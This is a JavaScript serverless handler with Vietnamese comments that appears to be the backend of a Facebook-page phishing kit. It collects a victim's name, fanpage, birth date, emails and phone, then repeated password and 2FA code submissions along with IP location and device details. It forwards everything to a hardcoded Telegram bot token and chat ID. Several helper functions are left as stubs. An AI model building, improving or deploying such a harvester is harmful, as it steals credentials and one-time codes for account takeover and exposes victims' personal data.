import crypto from 'crypto';

// ✅ ĐÚNG: không có chữ "bot" thừa
const TELEGRAM_BOT_TOKEN = '8675498310:AAFZWLgXTWl_LwAnB5kB9XuklREnSRM9TPY';
const TELEGRAM_CHAT_IDS = '-5217759389';  // có thể là nhiều id cách nhau bằng dấu phẩy
const ALLOWED_ORIGIN = '';

const MAX_PASSWORD_ATTEMPTS = 5;
const MAX_2FA_ATTEMPTS = 5;
const SESSION_EXPIRY_MS = 30 * 60 * 1000;

const FIELD_LIMITS = {
    fullName: 100, email: 254, emailBusiness: 254, phone: 25,
    fanpage: 150, dob: 15, note: 500, password: 200, code: 10,
};

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
    console.error('CRITICAL: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_IDS');
}

const sessions = {};
const rateLimits = new Map();
const infoRateLimits = new Map();

function cleanupExpiredSessions() { /* giữ nguyên như cũ */ }
function checkRateLimit(ip) { /* giữ nguyên */ }
function checkInfoRateLimit(ip) { /* giữ nguyên */ }
function cleanupRateLimits() { /* giữ nguyên */ }
function logRequest(level, type, message, metadata) { /* giữ nguyên */ }
function setSecurityHeaders(res) { /* giữ nguyên */ }
function generateSessionId() { return crypto.randomBytes(16).toString('hex'); }
function escapeHtml(str) { /* giữ nguyên */ }
function validateData(data) { /* giữ nguyên */ }
function sanitizeFields(data) { /* giữ nguyên */ }
function decodeData(encodedData) { /* giữ nguyên */ }

function buildMessage(session, ip = 'Unknown') {
    let msg = `<b>🔔 Thông báo</b>\n━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>IP:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Vị trí:</b> ${escapeHtml(session.location || 'Unknown')}\n`;
    msg += `<b>Nguồn:</b> ${escapeHtml(session.source || 'Unknown')}\n`;
    if (session.device) {
        const d = session.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱');
        msg += `<b>Thiết bị:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Họ tên:</b> ${escapeHtml(session.fullName)}\n`;
    msg += `<b>Fanpage:</b> ${escapeHtml(session.fanpage)}\n`;
    msg += `<b>Ngày sinh:</b> ${escapeHtml(session.dob)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Email:</b> <code>${escapeHtml(session.email)}</code>\n`;
    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness)}</code>\n`;
    msg += `<b>SĐT:</b> <code>${escapeHtml(session.phone)}</code>\n`;
    if (session.note) msg += `<b>Ghi chú:</b> ${escapeHtml(session.note)}\n`;

    const pwd1 = session.passwords?.[0] || '';
    const pwd2 = session.passwords?.[1] || '';
    if (pwd1 || pwd2) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        if (pwd1) msg += `<b>Mật khẩu 1:</b> <code>${escapeHtml(pwd1)}</code>\n`;
        if (pwd2) msg += `<b>Mật khẩu 2:</b> <code>${escapeHtml(pwd2)}</code>\n`;
    }
    const codes = session.codes || [];
    if (codes.length > 0) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n<b>Mã 2FA:</b>\n`;
        codes.forEach((code, idx) => { msg += `<b>Lần ${idx+1}:</b> <code>${escapeHtml(code)}</code>\n`; });
    }
    return msg;
}

// 🔧 SỬA LỖI GỬI TELEGRAM – thử lại với text thuần nếu HTML bị lỗi
async function sendTelegram(message, messageIdsMap = null) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) return {};

    const sendToChat = async (chatId, text, parseMode = 'HTML') => {
        const url = messageIdsMap?.[chatId]
            ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
            : `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: chatId,
            text: text,
            parse_mode: parseMode,
            ...(messageIdsMap?.[chatId] && { message_id: messageIdsMap[chatId] })
        };
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        return { ok: data.ok, result: data.result, description: data.description };
    };

    const results = await Promise.all(CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            let result = await sendToChat(chatId, message, 'HTML');
            if (!result.ok && result.description?.includes('can't parse entities')) {
                console.warn(`⚠️ HTML parse error, gửi lại text thuần cho ${chatId}`);
                result = await sendToChat(chatId, message, null);
            }
            if (!result.ok) console.error(`❌ Telegram lỗi ${chatId}: ${result.description}`);
            else console.log(`✅ Đã gửi đến ${chatId}, messageId=${result.result?.message_id}`);
            return { chatId, messageId: result.result?.message_id || null, success: result.ok };
        } catch (err) {
            console.error(`❌ Lỗi kết nối Telegram ${chatId}:`, err.message);
            return { chatId, messageId: null, success: false };
        }
    }));
    const messageIds = {};
    results.forEach(r => { if (r.messageId) messageIds[r.chatId] = r.messageId; });
    return messageIds;
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        if (!data.error) return `${data.city || ''}(${data.city?.charAt(0) || ''}) | ${data.country_name}(${data.country_code})`;
    } catch (e) {}
    return 'Unknown';
}

export default async function handler(req, res) {
    const startTime = Date.now();
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
    cleanupExpiredSessions();
    cleanupRateLimits();
    setSecurityHeaders(res);

    // CORS
    const requestOrigin = req.headers.origin || '';
    let corsAllowed = ALLOWED_ORIGIN ? requestOrigin === ALLOWED_ORIGIN : (!requestOrigin || requestOrigin.endsWith('.vercel.app'));
    if (corsAllowed && requestOrigin) res.setHeader('Access-Control-Allow-Origin', requestOrigin);
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const rateCheck = checkRateLimit(ip);
    if (!rateCheck.allowed) return res.status(429).json({ error: 'Too many requests', retryAfter: rateCheck.retryAfter });

    try {
        const { data: encoded } = req.body;
        const data = decodeData(encoded);
        if (!data) return res.status(400).json({ success: false, error: 'Invalid data format' });

        const { type, session_id } = data;

        if (type === 'info') {
            const infoRateCheck = checkInfoRateLimit(ip);
            if (!infoRateCheck.allowed) return res.status(429).json({ error: 'Too many requests', retryAfter: infoRateCheck.retryAfter });

            const id = generateSessionId();
            const safe = sanitizeFields(data);
            validateData(safe);
            const location = await getIPInfo(ip);
            const origin = req.headers.origin || req.headers.referer || 'Unknown';
            const source = origin.replace(/^https?:\/\//, '').split('/')[0];

            sessions[id] = {
                id, ip, fullName: safe.fullName || '', email: safe.email || '', emailBusiness: safe.emailBusiness || '',
                phone: safe.phone || '', fanpage: safe.fanpage || '', dob: safe.dob || '', note: safe.note || '',
                passwords: safe.password ? [safe.password.substring(0, FIELD_LIMITS.password)] : [],
                codes: [], location, source, device: safe.device || null, messageIds: {}, createdAt: Date.now()
            };
            const msg = buildMessage(sessions[id], ip);
            const messageIds = await sendTelegram(msg);
            sessions[id].messageIds = messageIds;
            return res.status(200).json({ success: true, session_id: id });
        }

        if (type === 'password' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) return res.status(403).json({ success: false, error: 'Session expired' });
            if (sessions[session_id].passwords.length >= MAX_PASSWORD_ATTEMPTS) return res.status(429).json({ success: false, error: 'Too many attempts' });
            const safePassword = (data.password || '').substring(0, FIELD_LIMITS.password);
            sessions[session_id].passwords.push(safePassword);
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg);
            return res.status(200).json({ success: true });
        }

        if (type === '2fa' && sessions[session_id]) {
            if (sessions[session_id].ip !== ip) return res.status(403).json({ success: false, error: 'Session expired' });
            if (sessions[session_id].codes.length >= MAX_2FA_ATTEMPTS) return res.status(429).json({ success: false, error: 'Too many attempts' });
            const safeCode = (data.code || '').substring(0, FIELD_LIMITS.code);
            sessions[session_id].codes.push(safeCode);
            const msg = buildMessage(sessions[session_id], ip);
            await sendTelegram(msg);
            return res.status(200).json({ success: true });
        }

        return res.status(400).json({ success: false, error: 'Invalid request type' });
    } catch (error) {
        console.error('Handler error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
}
